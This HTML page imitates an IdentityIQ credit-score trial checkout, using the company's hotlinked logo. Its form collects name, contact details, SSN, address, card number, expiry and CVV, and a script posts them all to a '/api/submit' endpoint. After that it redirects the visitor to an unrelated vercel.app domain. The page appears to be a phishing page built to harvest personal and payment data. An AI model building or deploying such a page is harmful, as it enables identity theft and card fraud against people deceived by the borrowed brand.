<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Credit Score Meter</title>
    <style>
        /* General Styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f6f8;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 42px;
            font-weight: 600;
            color: rgba(34, 34, 34, 1);
            text-align: center;
            margin: 0;
        }

        p {
            font-family: 'Crimson Text', serif;
            font-size: 20px;
            text-align: justify;
            margin: 20px 0;
            max-width: 600px;
        }

        .container {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            padding: 50px;
            gap: 40px;
        }

        /* Banner Image */
        .banner {
            width: 100%;
            text-align: center;
            margin-bottom: 30px;
        }

        .banner img {
            max-width: 100%;
            height: auto;
        }

        /* Form Container */
        .form-container {
            background: rgba(246, 156, 7, 0.1); /* Subtle background for the form */
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 100%;
        }

        label {
            font-family: 'Montserrat', sans-serif;
            font-size: 16px;
            font-weight: bold;
            color: rgba(34, 34, 34, 1);
            margin-bottom: 8px;
            display: block;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(34, 34, 34, 0.2);
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 15px;
            transition: border-color 0.3s ease;
        }

        input:focus,
        select:focus {
            border-color: rgba(246, 156, 7, 1);
            outline: none;
        }

        .btn {
            display: inline-block;
            text-align: center;
            background: rgba(246, 156, 7, 0.75);
            color: rgba(255, 255, 255, 1);
            font-family: 'Montserrat', sans-serif;
            font-size: 20px;
            font-weight: bold;
            padding: 15px 90px;
            border-radius: 100px;
            border: 3px solid rgba(1, 77, 130, 1);
            cursor: pointer;
        }

        .btn:hover {
            background: rgba(246, 156, 7, 1);
        }

        /* Order Summary Box */
        .order-summary {
            position: sticky;
            top: 20px;
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 20px;
            width: 300px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .order-summary h3 {
            font-size: 18px;
            font-weight: bold;
            margin: 0 0 15px;
        }

        .order-summary p {
            margin: 5px 0;
            font-size: 14px;
        }

        .order-summary strong {
            font-size: 16px;
            font-weight: bold;
        }

        .order-summary a {
            color: blue;
            text-decoration: underline;
        }

        .order-summary .total-due {
            font-size: 18px;
            font-weight: bold;
            margin-top: 15px;
        }

        @media only screen and (max-width: 800px) {
            .container {
                flex-direction: column;
                align-items: center;
            }

            .form-container {
                padding: 20px;
            }

            .btn {
                padding: 10px 20px;
                font-size: 16px;
            }

            .order-summary {
                position: static;
                width: 100%;
                margin-top: 20px;
            }
        }
    </style>
</head>
<body>

<!-- Header Image -->
<div class="banner">
    <img src="https://member.identityiq.com/WebResources/BusinessLogo/2023-01-27T202510.287Z.png " alt="IdentityIQ Logo">
</div>

<!-- Main Content -->
<div class="container">
    <!-- Order Placement Form -->
    <div class="form-container">
        <form id="orderForm">
            <!-- Title, First Name, Last Name -->
            <label for="title">Title</label>
            <select id="title" name="title" required>
                <option value="" disabled selected>Select Title</option>
                <option value="mr">Mr.</option>
                <option value="mrs">Mrs.</option>
                <option value="miss">Miss</option>
                <option value="ms">Ms.</option>
            </select>

            <label for="firstName">First Name</label>
            <input type="text" id="firstName" name="firstName" placeholder="Enter your first name" required>

            <label for="lastName">Last Name</label>
            <input type="text" id="lastName" name="lastName" placeholder="Enter your last name" required>

            <!-- Email and Phone Number -->
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="example@example.com" required>

            <label for="phone">Phone Number</label>
            <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>

            <!-- SSN -->
            <label for="ssn">SSN</label>
            <input type="text" id="ssn" name="ssn" placeholder="Enter your SSN">

            <!-- Address -->
            <label for="address">Complete Address</label>
            <input type="text" id="address" name="address" placeholder="Street Address" required>
            <input type="text" id="city" name="city" placeholder="City" required>
            <input type="text" id="zip" name="zip" placeholder="Post Code / ZIP Code" required>

            <!-- Payment Details -->
            <label>Payment Information</label>
            <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" required>
            <div style="display: flex; gap: 15px;">
                <input type="text" id="expiry" name="expiry" placeholder="Expiry (MM/YY)" required>
                <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="btn">Submit Order</button>
        </form>
    </div>

    <!-- Order Summary Box -->
    <aside class="order-summary">
        <h3>Order Summary</h3>
        <p><strong>CreditScoreIQ Trial</strong></p>
        <p><strong>7 Days Trial for $0.00</strong></p>
        <p><strong>Then $3.99/mo</strong></p>
        <ul style="padding: 0; list-style: none;">
            <li>3 Bureau Credit Report & Scores</li>
            <li><a href="#">ScoreCasterIQ</a></li>
            <li><u>Enhanced Credit Monitoring</u></li>
        </ul>
        <p><a href="#">More</a></p>
        <p class="total-due"><strong>Total Due: $0.00</strong></p>
    </aside>
</div>

<script>
document.getElementById('orderForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const formData = new FormData(this);
    const formDetails = Object.fromEntries(formData);

    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formDetails)
        });

        const result = await response.json();

        if (result.success) {
            window.location.href = "https://checking-index-html-purposely.vercel.app/ ";
        } else {
            alert("There was an error submitting your form.");
        }

    } catch (error) {
        console.error("Submission error:", error);
        alert("There was an error sending the form data.");
    }
});
</script>

</body>
</html>
